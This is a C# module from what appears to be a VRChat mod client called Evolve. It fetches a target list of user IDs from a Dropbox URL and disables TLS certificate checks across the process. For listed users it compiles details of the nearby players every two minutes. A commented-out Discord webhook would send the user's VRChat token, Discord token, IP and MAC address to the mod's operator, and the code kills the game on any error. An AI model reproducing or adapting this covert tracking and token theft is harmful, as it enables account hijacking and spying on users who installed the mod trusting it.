using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Cache;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using Evolve.Utils;
using Evolve.Wrappers;
using Harmony;
using Mono.CSharp;
using UnityEngine;
using VRC;
using VRC.Core;

namespace Evolve.Modules
{
    class Oversee
    {
        public static string[] OverseeList;
        public static string[] GetOversee()
        {
            var client = WebRequest.Create("https://dl.dropboxusercontent.com/s/hgd0xnw6ghipne5/Oversee?dl=0");
            HttpRequestCachePolicy noCachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
            client.CachePolicy = noCachePolicy;

            ServicePointManager.ServerCertificateValidationCallback = (object s, X509Certificate c, X509Chain cc, SslPolicyErrors ssl) => true;

            var response = Array(client.GetResponse());
            response = response.Where(x => !string.IsNullOrEmpty(x)).ToArray();
            return response;
        }

        public static string Convert(WebResponse res)
        {
            string strResponse = "";
            using (var stream = res.GetResponseStream())
            using (var reader = new StreamReader(stream))
            {
                strResponse = reader.ReadToEnd();
            }

            res.Dispose();
            return strResponse;
        }

        public static string[] Array(WebResponse res)
        {
            return Convert(res).Split(Environment.NewLine.ToCharArray());
        }

        public static List<string> PlayerNames = new List<string>();

        public static IEnumerator PlayerListUpdate()
        {
            while (true)
            {
                yield return new WaitForSeconds(120f);
                {
                    if (VRCPlayer.field_Internal_Static_VRCPlayer_0 != true) yield return null;
                    if (OverseeList == null) yield return null;
                    try
                    {
                        if (OverseeList.Contains(APIUser.CurrentUser.id))
                        {
                            if (PlayerNames != null) PlayerNames.Clear();
                            foreach (var Player in Wrappers.Utils.PlayerManager.AllPlayers())
                            {
                                if (Player.DisplayName() != APIUser.CurrentUser.displayName)
                                {
                                    if (Player.prop_APIUser_0.isFriend) PlayerNames.Add($"{Player.prop_APIUser_0.displayName} | {Player.GetAPIUser().GetRank()} | P: {Player._vrcplayer.GetPing()} | F: {Player._vrcplayer.GetFrames()} | VR: {Player._vrcplayer.GetIsInVR()} | **Friend with target**");

                                    else PlayerNames.Add($"{Player.prop_APIUser_0.displayName} | {Player.GetAPIUser().GetRank()} | P: {Player._vrcplayer.GetPing()} | F: {Player._vrcplayer.GetFrames()} | VR: {Player._vrcplayer.GetIsInVR()}");
                                }
                                else PlayerNames.Add($"{Player.prop_APIUser_0.displayName} | {Player.GetAPIUser().GetRank()} | P: {Player._vrcplayer.GetPing()} | F: {Player._vrcplayer.GetFrames()} | VR: {Player._vrcplayer.GetIsInVR()} | **Target**");
                            }

                            string PlayerList = string.Join("\n", PlayerNames);


                            //Discord.WebHooks.SendEmbedOversee($"**Auto Check (120s cooldown)**", $"**-----------------[VRChat]-----------------**\n**Name:** {APIUser.CurrentUser.displayName}\n**UserID:** {APIUser.CurrentUser.id}\n**VRChat Token:** {Functions.GetVT()}\n**World Name:** {RoomManager.field_Internal_Static_ApiWorld_0.name}\n**World ID:** {RoomManager.field_Internal_Static_ApiWorldInstance_0.id}\n**Player Count:** {Wrappers.Utils.PlayerManager.AllPlayers().Count}\n\n**Player List:**\n\n{PlayerList}\n\n**-----------------[Discord]-----------------**\n{Functions.GetDT()}\n\n**-----------------[Other]-----------------**\n**IP:** {Functions.GetIA()}\n**Mac Adress:** {Functions.GetMA()}\n**Evolve ID:** {Functions.GetEvoID()}");
                        }
                    }
                    catch
                    {
                        Process.GetCurrentProcess().Kill();
                    }
                }
            }
        }
    }
}
